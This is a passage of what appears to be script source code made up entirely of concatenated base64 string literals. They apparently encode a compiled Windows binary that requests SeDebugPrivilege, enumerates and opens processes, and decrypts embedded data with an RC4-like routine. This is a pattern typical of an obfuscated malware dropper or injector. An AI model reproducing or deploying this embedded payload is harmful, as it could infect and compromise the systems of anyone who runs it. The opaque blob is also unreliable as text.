'aBXwQACNRfzo917//8Pp6U///+vwi8NfXluL5V3Di8BVi+yDxOBTiVX8iEX7i0X86Pdb//8zwFVozPBAAGT/MGSJIDPbjUX0UGog6Nx7//9Q6GZ6//+FwHRcx0XgAQAAAI1F5FCLRfzoz1v//1BqAOg/ev//gH37AHQJx0XsAgAAAOsHx0XsAAAAgI1F8FBqAGoQjUXgUGoAi0X0UOgKev//6N17//+FwHUCswGLRfRQ6G56//8zwFpZWWSJEGjT' + 
'8EAAjUX86AVX///D6StP///r8IvDW4vlXcOLwLr08EAAsAHoOP///8MAAAD/////EAAAAFNlRGVidWdQcml2aWxlZ2UAAAAAVYvsgcTw/f//U4vaiUX8i0X86A1b//8zwFVoePFAAGT/MGSJIIvDi1X86FFf//9oCgIAAI2F8v3//1CLA+hOX///UOgMe///i8ONlfL9//+5BQEAAOgKX///M8BaWVlkiRBof/FAAI1F/OhZVv//w+l/Tv//6/Bb' + 
'i+Vdw1WL7DPJUVFRUVNWi9qL8DPAVWij8kAAZP8wZIkgjUX46ENx//+NRfzoU13//41F+Ogzcf//UOi58v//g334AHUPi8OLVfzocV3//+mpAAAAM9JVaHbyQABk/zJkiSKLxo1V9FJQagDopO///6kAAACAD5TA9tgbwIXAdFGNRfy6BAEAAOhvYf//i0X86INe//9Qi0X0UOhh8v//hcB0JotF/OhtXv//i9CNRfDo+13//4tF8OhrXv//i9CN' + 
'RfzoNWH//+sIjUX86LNc//+Lw4tV/OjlXP//M8BaWVlkiRBoffJAAItF9FCLRfhQiwD/UBTD6YFN///r6zPAWllZZIkQaKryQACNRfDoclz//41F+OhScP//jUX86GJc///D6VRN///r4F5bi+Vdw1WL7IPEpFNWVzPbiV2kiV38i/mL8ovYM8BVaJDzQABk/zBkiSBopPNAAFNopPNAAGis80AAVo1F/LoFAAAA6JFe//+NRbgzybpEAAAA6DZB' + 
'///HRbhEAAAAx0XkAQAAAGaJfeiNRahQjUW4UI1VpIvD6B4KAACLRaToal3//1BqAGowagBqAGoAi0X86Fdd//9QagDoM3j//4P4ARvAQIvYhNt0HWr/i0WoUOhEev//i0WoUOi7d///i0WsUOiyd///M8BaWVlkiRBol/NAAI1FpOh9W///jUX86HVb///D6WdM///r6IvDX15bi+VdwwIAAAAiAAAAAgAAACAAAABVi+yDxKRTVlcz24ldpIld' + 
'/Iv5i/KL2DPAVWhy9EAAZP8wZIkgaIj0QABTaIj0QABokPRAAFaNRfy6BQAAAOiRXf//jUW4M8m6RAAAAOg2QP//x0W4RAAAAMdF5AEAAABmiX3ojUWoUI1FuFCNVaSLw+geCQAAi0Wk6Gpc//9QagBqMGoAagBqAItF/OhXXP//UGoA6DN3//+FwHQFi12o6wIz2zPAWllZZIkQaHn0QACNRaTom1r//41F/OiTWv//w+mFS///6+iLw19eW4vl' + 
'XcMAAAIAAAAiAAAAAgAAACAAAABVi+yBxHD9//9TM9uJnXD9//+JnXT9//+JnXj9//+JXfSJXfCJjXz9//+JVfiJRfyNRfzo9F7//41F+OjsXv//jYWA/f//ixV830AA6Pte//8zwFVo7/ZAAGT/MGSJII1V9ItF+OgSCgAAjYV4/f//uQD3QACLVfToA1z//4uFeP3//42NgP3//7ovAAAA6AHr//+FwA+FvAAAADPAVWjk9UAAZP8wZIkgjUXw' + 
'i42U/f//i1X06MZb//+NRfBQi0Xw6E5b//+L2ItF/OhEW///K9hDU4tF/Og4W///i9BCi0XwWejUXP//i4V8/f///zD/dfBoDPdAAIuFfP3//7oDAAAA6Ohb//+LhXz9//+LAOj/Wv//g/hAfAro1Uv//+n7AAAAjYWA/f//6LXq//+FwA+Ecv///zPAWllZZIkQaOv1QACNhYD9///oKer//8PpE0r//+vtjYV0/f//uQD3QACLVfToFlv//4uF' + 
'dP3//42NgP3//7o/AAAA6BTq//+FwA+FlwAAADPAVWis9kAAZP8wZIkg9oWQ/f//EHRRi4WU/f//uhj3QADoiVv//3Q/i4WU/f//uiT3QADod1v//3Qti0UIUI2FcP3//4uNlP3//4tV9OilWv//i5Vw/f//i418/f//i0X86BH+//9ZjYWA/f//6Onp//+FwHSXM8BaWVlkiRBos/ZAAI2FgP3//+hh6f//w+lLSf//6+0zwFpZWWSJEGj29kAA' + 
'jYVw/f//ugMAAADoTFj//42FgP3//4sVfN9AAOjDXf//jUXwugQAAADoLlj//8PpCEn//+vKW4vlXcMABgAAACoALgAqAAAABAAAAA0ACgAAAAAABAAAAC4ALgAAAAAAAgAAAC4AAABVi+wzyVFRUVFRUVFTVleJVfiJRfyNRfzoe1z//41F+OhzXP//M8BVaDr4QABk/zBkiSDGRe8Ai0X8M9LoY1r//w+EowAAAItF+DPS6FNa//8PhJMAAACL' + 
'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' + 
'/Oh6Sf//M8BVaNkMQQBk/zBkiSDGRfsAjZXA/v//i0X86GLz//+LlcD+//+NhcT+///o4T///4uFxP7//42VyP7//+gofP//i4XI/v//UI2VsP7//zPA6Azx//+LhbD+//+NlbT+///oG/P//4uVtP7//42FuP7//+iaP///i4W4/v//jZW8/v//6OF7//+Llbz+//9Y6PlA//8PhGwBAAAz0rgCAAAA6CvZ//+JRfSDffT/D4RTAQAAg330AA+E' + 
'SQEAADPAVWhGDEEAZP8wZIkgjYXM/v//M8m6KAEAAOgUKf//x4XM/v//KAEAAI2VzP7//4tF9Oj82P//hcAPhOsAAAAzwFVo8wtBAGT/MGSJII2VoP7//4uF1P7//+hB/P//i4Wg/v//jZWk/v//6FTy//+LlaT+//+Nhaj+///o0z7//4uFqP7//42VrP7//+gae///i4Ws/v//UI2VlP7//4tF/Ogd8v//i5WU/v//jYWY/v//6Jw+//+LhZj+' + 
'//+NlZz+///o43r//4uVnP7//1jo+z///3UOi4XU/v//6N75//+IRfszwFpZWWSJEOsK6dgy///oWzX//42FzP7//zPJuigBAADoKSj//8eFzP7//ygBAACNlcz+//+LRfToMdj//4XAD4UV////M8BaWVlkiRBoTQxBAItF9FDo317//8PpsTP//+vvM8BaWVlkiRBo4wxBAI2FlP7//+ifQv//jYWY/v//ugIAAADofzv//42FoP7//7oCAAAA' + 
'6JdC//+Nhaj+//+6AgAAAOhfO///jYWw/v//ugIAAADod0L//42FuP7//7oCAAAA6D87//+NhcD+///oREL//42FxP7//7oCAAAA6CQ7//+NRfzoLEL//8PpHjP//+l3////D7ZF+19eW4vlXcOLwFNWV4PE+IgUJIv4M/bHRCQECAAAAItEJAToBiH//4vYjUQkBFCLRCQIUFMPtkQkDFBX/xWceUMAPQUAAIB0Bz0EAADAdSqLw+gLIf//i0Qk' + 
'BOjOIP//i9iNRCQEUItEJAhQUw+2RCQMUFf/FZx5QwCFwHIgg3sEAHQaD7cDg8AC6J8g//+L8A+3C4tTBIvG6MBg//+Lw+i9IP//i8ZZWl9eW8OQVYvsg8T0U1aLXQiL84sGiUX3i0YEiUX7ikYIiEX/D7ZV+4tF9+gy////iUX8i0X3iQaLRfuJRgSKRf+IRghqAOjrXf//XluL5V3CBACNQABVi+yDxOxTVovai/AzwIlF/I1F8zPJugkAAADo' + 
'NCb//4l184hd92oAagCNRfNQaJQNQQBqAGoA6Gxd//+JReyDfewAdFgzwFVoeg5BAGT/MGSJIGpki0XsUOhiX///g+gBcgktAQEAAHQK6xOLRfiJRfzrC2oAi0XsUOgpX///M8BaWVlkiRBogQ5BAItF7FDoq1z//8PpfTH//+vvi0X8XluL5V3Di8BVi+y5CwAAAGoAagBJdflRU1ZXiUX8jUX86BZF//8zwFVosxFBAGT/MGSJIMZF8wCNVdAz' + 
'wOji7P//i1XQi0X86PtC//8PhHoCAACNVcy40BFBAOjs9f//i0XM6FA9//9QjVXIuAgSQQDo1vX//4tFyOg6Pf//UOikXf//UOimXf//o5x5QwCNVcS4PBJBAOiw9f//i0XE6BQ9//9QjVXAuIASQQDomvX//4tFwOj+PP//UOhoXf//UOhqXf//o6B5QwChoHlDAIXAD4T1AQAAhcAPhO0BAAC7AAAQAIvD6KQe//+JRdyNReRQU4tF3FBqEP8V' + 
'oHlDAIN95AAPhMMBAACFwA+FswEAAItF3IsASIXAD4ylAQAAQIlF1MdF4AAAAACLXeAD24tF3ItE2ARQagBoUAQAAOhsXf//iUXsg33s/w+EaAEAAGoCagBqAI1F6FDoSFz//1CLRdwPt0TYClCLRexQ6K1b//+FwHUHx0Xo/////4N96P8PhCgBAACyAYtF6OjO/f//iUXYg33YAA+ECAEAADPAVWgkEUEAZP8wZIkgi0Xci0TYBI1V+Ohk9///' + 
'i0X4M9LogkH//w+EvgAAAI1VvDPA6E7r//+LVbyLRfjoZ0H//w+EowAAAI1VsItF+OhS7f//i1WwjUW06Nc5//+LRbSNVbjoJHb//4tFuFCNVay4tBJBAOgz9P//i1WsWOguO///dGYzwFVoBBFBAGT/MGSJII1F9ItV2OhvP///jVWoi0X86Pzs//+LRahQjVWki0X06O3s//+LVaRY6OhA//91FItF4APAi1Xci0TCBOjN9P//iEXzM8BaWVlk' + 
'iRDrCunHLf//6Eow//8zwFpZWWSJEGgrEUEAi0XY6CUd///D6dMu///r8ItF6FDo8Fn//4tF7FDo51n///9F4P9N1A+FZv7//4tF3Oj3HP//M8BaWVlkiRBouhFBAI1FpLoCAAAA6LE9//+NRazoXTb//41FsOiJPf//jUW0ugIAAADobDb//41FvOh0Pf//jUXAugQAAADoVzb//41F0OhfPf//jUX0ugMAAADoaj3//8PpRC7//+ukD7ZF819e' + 
'W4vlXcMAAAD/////LQAAAHtP/41rN2uUu7zzBkOHoS+ThrnVAPFd3/ROGaRcg5fIuoQE+zozTqKNnWcZXQAAAP////8pAAAAEzLaVSQqLVrZL1AeTzxSGRnQ157G34xWvNLQAN13hG7jGRYpGj0PT1QAAAD/////OAAAAAQA9SyT89o4IJ59Z40SQnNZlAbY3uDk3kSslNHKFa8xN2UQgWSuwiDRiCsxQVopdgWy2lVknSXnAAAAAP////8pAAAA' + 
'Iwgeb3GdTH93XBmxexSGi6m8kDGZqhLDnSLbcXvcVas4kwWxw79yvPcAAAD/////LAAAAP+y8IosqpIkWueZtHlo+CeuhzQjXCPre4HYicO3HoXICi/u+ICzZHu3gf64AAAAAFWL7DPAVWgJE0EAZP8wZIkg/wWQeUMAM8BaWVlkiRBoEBNBAMPp7iz//+v4XcOLwBgTQQARAi4xBAAAAAAAAAADAAAAFBBAAAVGR0ludIvAOBNBAA4GVEZHSW50' + 
'CAAAAAEAAAAUE0EABAAAAFNWgcQA////i/KL2IvUi8PozyH//4vUi8boxjb//4HEAAEAAF5bw5BVi+yDxPiJRfyLRfzoozj//zPAVWi7E0EAZP8wZIkgjVX4i0X86J4h//+JRfgzwFpZWWSJEGjCE0EAjUX86BY0///D6Tws///r8ItF+FlZXcONQAA70H8Ci8LDkFWL7IPE+FNWVzPJiU34i/qJRfwzwFVoSxRBAGT/MGSJIDPbvgEAAACNRfhQ' + 
'uQEAAACL1ovH6JY4//+LRfi6ZBRBAOi5N///dQ25CAAAACvOsAHS4ArYRoP+CXXMi0X8iBgzwFpZWWSJEGhSFEEAjUX46IYz///D6awr///r8F9eW1lZXcMAAAD/////AQAAADEAAABVi+y5CAAAAGoAagBJdflTVleJRfgzwFVoyxVBAGT/MGSJIDPAiUX0M8CJRfAzwIlF7DPAiUXoM8CJReQz/zP2M9uNRfzoHjP//41V3ItF9OiT/v///3Xc' + 
'jVXYi0Xw6IX+////ddiNVdSLRezod/7///911I1V0ItF6Ohp/v///3XQjVXMi0Xk6Fv+////dcyNVciLx+hO/v///3XIjVXEi8boQf7///91xI1VwIvD6DT+////dcCNRfy6CAAAAOgUNv//jUXji1X86J3+//8PtkXji1X4jQSCi1X86Nsy//9Dg/sCD4VX////RoP+Ag+FS////0eD/wIPhT//////ReSDfeQCD4Uw/////0Xog33oAg+FHv//' + 
'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' + 
